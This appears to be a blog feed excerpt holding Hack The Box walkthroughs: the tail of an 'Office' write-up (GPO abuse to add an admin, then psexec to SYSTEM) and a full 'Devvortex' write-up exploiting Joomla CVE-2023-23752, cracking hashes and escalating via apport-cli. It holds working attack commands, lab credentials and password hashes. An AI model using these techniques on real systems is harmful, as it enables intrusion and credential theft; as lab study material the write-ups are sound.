<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Policy&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain = office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain Controller = DC.office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO does not specify any group memberships.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] versionNumber attribute changed successfully
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The version number in GPT.ini was increased successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Done!
</span></span></code></pre></div><p>I update windows group policy settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; gpupdate /force
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Updating policy...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Computer Policy update has completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Policy update has completed successfully.
</span></span></code></pre></div><p>I can easily see that HHogan are in the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; net localgroup Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Alias name     Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Members
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>impacket<span style="color:#ff79c6">-</span>psexec<span style="color:#ff79c6">.</span>py HHogan:H4ppyFtW183<span style="color:#6272a4">#@10.10.11.3   </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ff79c6">.</span><span style="color:#bd93f9">12.0</span><span style="color:#ff79c6">.</span>dev1<span style="color:#ff79c6">+</span><span style="color:#bd93f9">20230907.33311</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">3</span>f645107 <span style="color:#ff79c6">-</span> Copyright <span style="color:#bd93f9">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Requesting shares on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Found writable share ADMIN<span style="color:#ff79c6">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Uploading file kbuDcLOn<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Opening SVCManager on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Creating service NOKZ on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Starting service NOKZ<span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">!</span>] Press help <span style="color:#ff79c6">for</span> extra shell commands
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft Windows [Version <span style="color:#bd93f9">10.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">20348.2322</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation<span style="color:#ff79c6">.</span> All rights reserved<span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#ff79c6">&gt;</span> whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nt authority\system
</span></span></code></pre></div><h2 id="reference">Reference</h2>
<p><a href="https://namiq.net/blog/htb-office-writeup-hackthebox">For root flag I followed namiq.net&rsquo;s walkthrough.</a></p>
]]></description></item><item><title>HTB Machine Devvortex</title><link>https://hshakilst.github.io/posts/htb-machines/devvortex/</link><pubDate>Thu, 16 May 2024 16:41:36 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/devvortex/</guid><description><![CDATA[<h1 id="devvortex---htbhttpswwwhacktheboxcommachinesdevvortex">Devvortex - <a href="https://www.hackthebox.com/machines/devvortex">HTB</a></h1>
<p><img src="images/banner.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap-services">Nmap Services</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
</tr>
</thead>
<tbody>
<tr>
<td>80</td>
<td>http (nginx/1.18.0)</td>
</tr>
<tr>
<td>22</td>
<td>ssh ()</td>
</tr>
</tbody>
</table>
<h3 id="subdomains-vhost">Subdomains (VHost)</h3>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fs 154 

    /'___\  /'___\           /'___\       
   /\ \__/ /\ \__/  __  __  /\ \__/       
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
     \ \_\   \ \_\  \ \____/  \ \_\       
      \/_/    \/_/   \/___/    \/_/       

   v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://devvortex.htb
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Header           : Host: FUZZ.devvortex.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 135ms]
:: Progress: [26584/26584] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:56] :: Errors: 1 ::
</code></pre>
<ul>
<li><strong>dev.devvortex.htb</strong></li>
</ul>
<h3 id="http-enumeration---devdevvortexhtb">HTTP Enumeration - dev.devvortex.htb</h3>
<ul>
<li>
<p><strong>ffuf</strong></p>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -u http://dev.devvortex.htb/FUZZ                       

  /'___\  /'___\           /'___\       
 /\ \__/ /\ \__/  __  __  /\ \__/       
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
   \ \_\   \ \_\  \ \____/  \ \_\       
    \/_/    \/_/   \/___/    \/_/       

 v2.1.0-dev
________________________________________________
:: Method           : GET
:: URL              : http://dev.devvortex.htb/FUZZ
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 423ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 106ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1176ms]
cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
:: Progress: [26584/26584] :: Job [1/1] :: 33 req/sec :: Duration: [0:12:53] :: Errors: 2 ::
</code></pre>
</li>
<li>
<p><strong>robots.txt</strong> - <a href="http://dev.devvortex.htb/robots.txt">http://dev.devvortex.htb/robots.txt</a></p>
<pre><code>&lt;---snipped---&gt;
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
</code></pre>
</li>
<li>
<p><strong>README.txt</strong></p>
<pre><code>Joomla! CMSâ¢

1- Overview
	* This is a Joomla! 4.x installation/upgrade package.
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev

  &lt;---snipped---&gt;
</code></pre>
</li>
<li>
<p><strong>Services Running</strong></p>
<ul>
<li>Joomla CMS 4.2</li>
</ul>
</li>
</ul>
<h3 id="vulnerability-assessment---joomla-cms-42">Vulnerability Assessment - Joomla CMS 4.2</h3>
<ul>
<li>
<p><strong>Vulnerability</strong>: Joomla CMS 4.2 is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check in <code>Core</code> webservice endpoints. The affected versions are 4.0.0-4.2.7 in range. Due to flaws in Joomlaâs access control to Web service endpoints, unauthenticated attackers access the RestAPI interface to obtain Joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. For more on the vulnerability :</p>
<ul>
<li><a href="https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/">NS Focus Global</a></li>
<li><a href="https://vulncheck.com/blog/joomla-for-rce">Vuln Check</a></li>
</ul>
</li>
<li>
<p><strong>PoC</strong>: A publicly available exploit is published on <a href="https://www.exploit-db.com/exploits/51334">ExploitDB</a>. We can use this <code>{root_url}/api/index.php/v1/users?public=true</code> REST endpoint to obtain user information , and this <code>{root_url}/api/index.php/v1/config/application?public=true</code> endpoint for application configuration.</p>
</li>
</ul>
<h2 id="joomla-cms-42">Joomla CMS 4.2</h2>
<h3 id="exploiting-cve-2023-23752">Exploiting CVE-2023-23752</h3>
<ul>
<li>
<p><strong>User Information</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/v1/users?public=true

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/v1\/users?public=true&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;649&quot;,&quot;attributes&quot;:{&quot;id&quot;:649,&quot;name&quot;:&quot;lewis&quot;,&quot;username&quot;:&quot;lewis&quot;,&quot;email&quot;:&quot;lewis@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:1,&quot;registerDate&quot;:&quot;2023-09-25 16:44:24&quot;,&quot;lastvisitDate&quot;:&quot;2024-04-26 10:37:12&quot;,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Super Users&quot;}},{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;650&quot;,&quot;attributes&quot;:{&quot;id&quot;:650,&quot;name&quot;:&quot;logan paul&quot;,&quot;username&quot;:&quot;logan&quot;,&quot;email&quot;:&quot;logan@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:0,&quot;registerDate&quot;:&quot;2023-09-26 19:15:42&quot;,&quot;lastvisitDate&quot;:null,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Registered&quot;}}],&quot;meta&quot;:{&quot;total-pages&quot;:1}}      
</code></pre>
</li>
<li>
<p><strong>Application Config</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&quot;,&quot;next&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&quot;,&quot;last&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_message&quot;:&quot;This site is down for maintenance.&lt;br&gt;Please check back again soon.&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;display_offline_message&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_image&quot;:&quot;&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;sitename&quot;:&quot;Development&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;editor&quot;:&quot;tinymce&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;captcha&quot;:&quot;0&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;list_limit&quot;:20,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;access&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang_const&quot;:true,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbtype&quot;:&quot;mysqli&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;host&quot;:&quot;localhost&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;user&quot;:&quot;lewis&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;password&quot;:&quot;P4ntherg0t1n5r3c0n##&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;db&quot;:&quot;joomla&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbprefix&quot;:&quot;sd4fg_&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbencryption&quot;:0,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbsslverifyservercert&quot;:false,&quot;id&quot;:224}}],&quot;meta&quot;:{&quot;total-pages&quot;:4}}
</code></pre>
<p>We can see from the <code>meta</code> that it&rsquo;s only page 1 out of 4. We should gather all the data from this api using the <code>next</code> link and save it to a file.</p>
</li>
</ul>
<h3 id="users-and-credentials">Users and Credentials</h3>
<ul>
<li>
<p><strong>Users</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;id&quot;: 649,
    &quot;name&quot;: &quot;lewis&quot;,
    &quot;username&quot;: &quot;lewis&quot;,
    &quot;email&quot;: &quot;lewis@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 1,
    &quot;registerDate&quot;: &quot;2023-09-25 16:44:24&quot;,
    &quot;lastvisitDate&quot;: &quot;2024-04-26 10:37:12&quot;,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Super Users&quot;
}
</code></pre>
</li>
<li>
<p>logan:</p>
<pre><code>{
    &quot;id&quot;: 650,
    &quot;name&quot;: &quot;logan paul&quot;,
    &quot;username&quot;: &quot;logan&quot;,
    &quot;email&quot;: &quot;logan@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 0,
    &quot;registerDate&quot;: &quot;2023-09-26 19:15:42&quot;,
    &quot;lastvisitDate&quot;: null,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Registered&quot;
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Credentials</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;user&quot;: &quot;lewis&quot;,
        &quot;id&quot;: 224
    }
},
{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;password&quot;: &quot;P4ntherg0t1n5r3c0n##&quot;,
        &quot;id&quot;: 224
    }
},
</code></pre>
<p>We can try this creds to log into the admin dashboard of Joomla at <code>http://dev.devvortex.htb/administrator</code>.</p>
</li>
</ul>
</li>
</ul>
<h3 id="admin-dashboard-enumeration">Admin Dashboard Enumeration</h3>
<ul>
<li>PHP: 7.4.3 which is obsolete and no longer receives official security updates.</li>
<li>MySQL: 8.0.35-0ubuntu0.20.04.1</li>
<li>Server: Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64</li>
<li>Disable PHP Functions:
<ul>
<li>pcntl_alarm</li>
<li>pcntl_fork</li>
<li>pcntl_waitpid</li>
<li>pcntl_wait</li>
<li>pcntl_wifexited</li>
<li>pcntl_wifstopped</li>
<li>pcntl_wifsignaled</li>
<li>pcntl_wifcontinued</li>
<li>pcntl_wexitstatus</li>
<li>pcntl_wtermsig</li>
<li>pcntl_wstopsig</li>
<li>pcntl_signal</li>
<li>pcntl_signal_get_handler</li>
<li>pcntl_signal_dispatch</li>
<li>pcntl_get_last_error</li>
<li>pcntl_strerror</li>
<li>pcntl_sigprocmask</li>
<li>pcntl_sigwaitinfo</li>
<li>pcntl_sigtimedwait</li>
<li>pcntl_exec</li>
<li>pcntl_getpriority</li>
<li>pcntl_setpriority</li>
<li>pcntl_async_signals</li>
<li>pcntl_unshare</li>
</ul>
</li>
<li>Phar: PHP Archive support is enabled. Can be used to bypass upload restriction for a shell.</li>
</ul>
<h3 id="getting-foothold">Getting Foothold</h3>
<p>In the <code>System</code> menu Joomla offeres option to customize a template. I customized a template by modifying a existing php file. By inserting a shellcode I was successful getting a shell on the box as <code>www-data</code> user.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-stabilization">Shell Stabilization</h3>
<p>The shell was not stable at all. I couldn&rsquo;t see any interective output because I was missing an actual shell.</p>
<p><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></p>
<p>I was <code>www-data</code> and it&rsquo;s shell was assigned nologin. I did the following to make the shell stable.</p>
<pre><code>script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
</code></pre>
<p>Then I had a good enough shell to work with.</p>
<h3 id="user-enumeration">User Enumeration</h3>
<p>After inspecting the <code>/etc/passwd</code> file I was sure that I had to escalate my privileges and take over <code>logan</code>  account. I could list the account&rsquo;s home directory and found the user flag but didn&rsquo;t have permission to read it.</p>
<h3 id="service-enumeration">Service Enumeration</h3>
<p>After inspecting for users I tried to access the MySQL database to find any credentials that can help me pivot to <code>logan</code>. So I logged in to the database service using the <code>lewis:P4ntherg0t1n5r3c0n##</code> and it worked.</p>
<h3 id="mysql-enumeration">MySQL Enumeration</h3>
<ul>
<li>
<p><strong>Databses</strong>:</p>
<pre><code>show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
</code></pre>
</li>
<li>
<p><strong>Tables</strong>:</p>
<pre><code>+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
</code></pre>
</li>
<li>
<p>Users:</p>
<pre><code> +----------+--------------------------------------------------------------+
 | username | password                                                     |
 +----------+--------------------------------------------------------------+
 | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
 | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
 +----------+--------------------------------------------------------------+
</code></pre>
</li>
</ul>
<h3 id="cracking-the-logan-hash">Cracking the <code>logan</code> Hash</h3>
<p>Using john the ripper I was able to crack the hash for logan.</p>
<p><code>logan:tequieromucho</code></p>
<p>Let&rsquo;s try this credential to log on. I could successfully log in using <code>ssh</code>.</p>
<h3 id="root-privilege-escalation">Root Privilege Escalation</h3>
<p>After login into the <code>logan</code> account. I ran the command <code>sudo -l</code> with the above password. And I found following sudoers privileges for the account.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Matching Defaults entries for logan on devvortex:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
</span></span><span style="display:flex;"><span>    (ALL : ALL) /usr/bin/apport-cli
</span></span></code></pre></div><p>So <code>logan</code> can run <code>/usr/bin/apport-cli</code> with <code>sudo</code>. After, searching for apport-cli&rsquo;s know vulnerability I found a Privilege Escalation Vulnerability for apport-cli &lt;= v2.26.0 dubbed <code>CVE-2023-1326</code>. The machine&rsquo;s <code>apport-cli</code> version is <code>2.20.11</code>. So it can be exploited if certain conditions are met. <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">For more on the PoC</a>.</p>
<ol>
<li>
<p>System should specially configured to allow unprivileged users to run sudo apport-cli.</p>
</li>
<li>
<p><code>less</code> is configured as the pager.</p>
</li>
<li>
<p>The terminal size can be set.</p>
</li>
</ol>
<p>Unfortunately all of the conditions were present in the box and we successfully gained <code>root</code> privilege following the steps described in PoC. Finally, acquired the root flag.</p>
]]></description></item><item><title>HTB Sherlock Noted</title><link>https://hshakilst.github.io/posts/htb-sherlocks/noted/</link><pubDate>Thu, 16 May 2024 12:59:39 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/noted/</guid><description><![CDATA[<h1 id="noted-dfir">Noted (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
